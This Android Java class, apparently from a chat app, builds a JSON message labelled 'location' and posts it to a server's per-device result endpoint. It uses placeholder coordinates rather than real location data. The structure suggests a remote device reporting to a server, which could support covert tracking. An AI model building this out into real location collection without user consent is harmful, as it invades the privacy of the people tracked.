package com.example.teamchat;

import static com.example.teamchat.Constants.SERVER;

import android.content.Context;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

public class LocationTracker {
    private final static String TAG = ChatService.class.getSimpleName();

    public static void getLocation(Context context, String id) throws JSONException {
        JSONObject location = new JSONObject();
        location.put("latitude", "your_latitude");
        location.put("longitude", "your_longitude");

        JSONObject parentObject = new JSONObject();
        parentObject.put("code", "location");
        parentObject.put("data", location);
        System.out.println(parentObject);

        try {
            HttpConnection.ReturnResponse response = HttpConnection.connect(SERVER + "result/" + id, "POST", parentObject.toString());

            assert response != null;
            if (response.responseCode == 200) {
                Log.d(TAG, "Response: " + response.body);
            } else {
                throw new IOException("Unexpected code " + response.responseCode);
            }
        } catch (IOException e) {
            Log.e(TAG, "Error sending request: " + e.getMessage());
        }
    }
}